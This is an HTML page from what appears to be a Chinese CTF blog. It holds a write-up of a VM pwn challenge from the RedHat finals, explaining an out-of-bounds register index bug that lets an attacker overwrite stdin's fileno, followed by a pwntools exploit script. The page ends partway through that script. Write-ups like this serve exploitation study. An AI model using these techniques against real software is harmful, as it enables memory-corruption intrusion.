@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ReaHat_final_pwn | Whali3n51&#39;s blog</title>
+  <meta name="keywords" content=" WP复现 , Writeup ">
+  <meta name="description" content="ReaHat_final_pwn | Whali3n51&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="404 not found页面未找到">
+<meta property="og:type" content="website">
+<meta property="og:title" content="404">
+<meta property="og:url" content="http:&#x2F;&#x2F;whali3n51.github.io&#x2F;404&#x2F;index.html">
+<meta property="og:site_name" content="Whali3n51&#39;s blog">
+<meta property="og:description" content="404 not found页面未找到">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-12T10:01:15.899Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Whali3n51</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="email" href="mailto:Whali3n51@gmail.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1453872020&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+<a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(18)</small></div></li>
+    
+        
+            
+            <li><div data-rel="pwn学习">pwn学习<small>(6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Writeup">Writeup<small>(6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码学">密码学<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其他">其他<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="18">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://www.kkzevip.com/">MoR03r</a></li>
+            
+            <li><a target="_blank" href="https://pdsdt.ginkgoteam.com/">Pdsdt</a></li>
+            
+            <li><a target="_blank" href="http://www.dongzt.cn/">Alkaid</a></li>
+            
+            <li><a target="_blank" href="https://www.virzz.com/">Virink’s Blog</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">WP复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color4">pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color1">re_wp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">re复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color3">Writeup</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="pwn学习 "
+           href="/2019/11/28/RedHat/"
+           data-tag="WP复现,Writeup"
+           data-author="" >
+            <span class="post-title" title="ReaHat_final_pwn">ReaHat_final_pwn</span>
+            <span class="post-date" title="2019-11-28 23:30:00">2019/11/28</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="湖湘杯线上赛pwn_wp">湖湘杯线上赛pwn_wp</span>
+            <span class="post-date" title="2019-11-11 14:14:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/HECTF/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="HECTF_Pwn_wp">HECTF_Pwn_wp</span>
+            <span class="post-date" title="2019-11-11 13:51:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="上海大学生网络安全PWN_wp">上海大学生网络安全PWN_wp</span>
+            <span class="post-date" title="2019-11-11 13:37:00">2019/11/11</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="给新生—关于二进制怎么学习">给新生—关于二进制怎么学习</span>
+            <span class="post-date" title="2019-09-01 12:41:00">2019/09/01</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="five空间大赛">five空间大赛</span>
+            <span class="post-date" title="2019-09-01 11:22:00">2019/09/01</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="攻防世界高手进阶PWN（２）">攻防世界高手进阶PWN（２）</span>
+            <span class="post-date" title="2019-09-01 11:09:00">2019/09/01</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="关于Win10自动更新1903之后只能新建文件夹">关于Win10自动更新1903之后只能新建文件夹</span>
+            <span class="post-date" title="2019-08-30 10:08:00">2019/08/30</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/08/06/CN16/"
+           data-tag="WP复现"
+           data-author="" >
+            <span class="post-title" title="CISCN_final_CN16">CISCN_final_CN16</span>
+            <span class="post-date" title="2019-08-06 07:04:35">2019/08/06</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/06/13/CISCN%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E8%84%9A%E6%9C%AC%E5%8F%8A%E6%80%BB%E7%BB%93/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CISCN华北赛区pwn脚本及总结">CISCN华北赛区pwn脚本及总结</span>
+            <span class="post-date" title="2019-06-13 20:01:00">2019/06/13</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/04/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="堆溢出的unlink漏洞利用">堆溢出的unlink漏洞利用</span>
+            <span class="post-date" title="2019-06-04 14:41:00">2019/06/04</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/02/Unsorted%20bin%20attack/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="Unsorted bin attack">Unsorted bin attack</span>
+            <span class="post-date" title="2019-06-02 17:54:00">2019/06/02</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/31/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9A%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B_AP_Pwn%20%20writeup/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="强网杯：强网先锋_AP_Pwn  writeup">强网杯：强网先锋_AP_Pwn  writeup</span>
+            <span class="post-date" title="2019-05-31 13:07:00">2019/05/31</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/29/%E6%A1%82%E7%94%B5RE%E5%85%A8%E8%A7%A3WriteUp/"
+           data-tag="re_wp"
+           data-author="" >
+            <span class="post-title" title="桂电RE全解WriteUp">桂电RE全解WriteUp</span>
+            <span class="post-date" title="2019-05-29 13:23:00">2019/05/29</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91testre/"
+           data-tag="re复现"
+           data-author="" >
+            <span class="post-title" title="西湖论剑testre">西湖论剑testre</span>
+            <span class="post-date" title="2019-05-28 22:15:00">2019/05/28</span>
+        </a>
+        
+        <a  class="密码学 "
+           href="/2019/05/28/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="RC4加密算法的原理讲解">RC4加密算法的原理讲解</span>
+            <span class="post-date" title="2019-05-28 16:46:00">2019/05/28</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/28/%E7%8E%B0%E4%BB%A3unlink%E6%BC%8F%E6%B4%9E%E8%AE%B2%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="现代unlink漏洞讲解与利用">现代unlink漏洞讲解与利用</span>
+            <span class="post-date" title="2019-05-28 12:56:00">2019/05/28</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/28/%E7%AE%80%E5%8D%95%E8%AE%B2%E8%A7%A3%E9%80%9A%E8%BF%87extend_overlopping%E6%9D%A5%E5%88%A9%E7%94%A8fast%20bin%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E4%BD%8D%E7%BD%AE%E7%9A%84%E8%AF%BB%E5%86%99/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写">简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写</span>
+            <span class="post-date" title="2019-05-28 12:25:00">2019/05/28</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-RedHat" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ReaHat_final_pwn</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" target="_blank" data-rel="pwn学习 noopener">pwn学习</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" target="_blank" rel="noopener" class="color5">WP复现</a>
+            
+            <a href="javascript:" target="_blank" rel="noopener" class="color3">Writeup</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-11-28 23:23:42'>2019-11-28 23:30</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01粤湾中心"><span class="toc-text">0x01粤湾中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-粤湾银行"><span class="toc-text">0x02 粤湾银行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-粤湾证券"><span class="toc-text">0x03 粤湾证券</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在是做不出来，就不写了。</p>
+<h2 id="0x01粤湾中心"><a href="#0x01粤湾中心" class="headerlink" title="0x01粤湾中心"></a>0x01粤湾中心</h2><p>这一道题比赛现场没时间做，我的逆向太菜了，当时只看懂了一个大概。赛后也想向其他师傅请教了一下。</p>
+<p>首先拿到这道题看一下开启的保护</p>
+<pre><code>Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled</code></pre><p>这一道题不能直接getshell，因为开启了prctl,禁用了execve</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>这一道题最初打flag文件，然后将fd重定位到了0x233这个地方。所以我们解这一道题的主要思路就是将fileno的值改为0x233，然后当程序读取输入的时候，自动去0x233这个地方读取输入，然后再将输入打印出来，刚好本题结尾处就有这样的条件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Could you tell me your name?"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%99s"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Goodbye~ %s\n"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"See you next time."</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以我们现在只需要将fileno该为0x233就可以了。</p>
+<p>这一题提供了加减乘除等等指令。这个题的漏洞就是在读取寄存器的时候，没有对索引值进行检查，导致了越界读写。因此将栈地址改为fileno的地址，通过入栈操作就可以将该题fileno修改了。不过计算起来贼麻烦，我没有自己算，哈哈哈哈哈哈哈 ，贴一下其他师傅的脚本吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./RHVM.bin"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line"><span class="comment">#context.terminal=["tmux","splitw","-h"]</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="literal">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    set $reg = ($text_base+0x0000000000203060)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000001B15)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(op,idx1,idx2)</span>:</span></span><br><span class="line">    p = (op&lt;&lt;<span class="number">16</span>) | (idx1&lt;&lt;<span class="number">8</span>) | idx2 </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(len)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Give me code length: \n"</span>,str(len))</span><br><span class="line">    a.recvuntil(<span class="string">"Give me code: \n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(idx1,value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,idx1,value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovDataToReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x42</span>,idx1,idx2)<span class="comment">#reg[reg[idx1]] = data[reg[idx2]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MovRegToData</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x41</span>,idx1,idx2)<span class="comment">#data[reg[idx1]] = reg[idx2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xa0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeftShift</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xe0</span>,idx1,idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PushReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PopReg</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,<span class="number">0</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MulReg</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xc0</span>,idx1,idx2)</span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),<span class="comment"># reg[1] = 12</span></span><br><span class="line">    Read(<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = 0-8=-4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment"># reg[0] = -16</span></span><br><span class="line">    Read(<span class="number">3</span>,<span class="number">4</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>),<span class="comment"># reg[4] = data[-16]</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -15</span></span><br><span class="line">    AddReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 5</span></span><br><span class="line">    MovDataToReg(<span class="number">3</span>,<span class="number">0</span>), <span class="comment"># get stderr addr</span></span><br><span class="line">    Read(<span class="number">6</span>,<span class="number">5</span>),<span class="comment">#reg[6] = 5</span></span><br><span class="line">    Read(<span class="number">7</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">2</span>),<span class="comment">#reg[7]= 9</span></span><br><span class="line">    LeftShift(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">5</span>),</span><br><span class="line">    LeftShift(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    Read(<span class="number">1</span>,<span class="number">8</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">7</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">6</span>,<span class="number">7</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">6</span>),<span class="comment"># ==&gt; stdin.fileno</span></span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">    SubReg(<span class="number">4</span>,<span class="number">3</span>),<span class="comment"># ==&gt; stdin.fileno-4</span></span><br><span class="line">    AddReg(<span class="number">0</span>,<span class="number">1</span>),<span class="comment">#reg[0] = -15+8 = -7</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -8</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -9</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">5</span>),</span><br><span class="line">    SubReg(<span class="number">3</span>,<span class="number">2</span>),<span class="comment">#reg[3] = 4</span></span><br><span class="line">    SubReg(<span class="number">0</span>,<span class="number">2</span>),<span class="comment">#reg[0] = -10</span></span><br><span class="line">    MovRegToData(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">    MulReg(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">3</span>),</span><br><span class="line">    AddReg(<span class="number">1</span>,<span class="number">7</span>),</span><br><span class="line">    PushReg(<span class="number">1</span>)<span class="comment"># fileno ==&gt; 0x233</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">Init(len(payload))</span><br><span class="line">debug()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a.sendline(str(i))</span><br><span 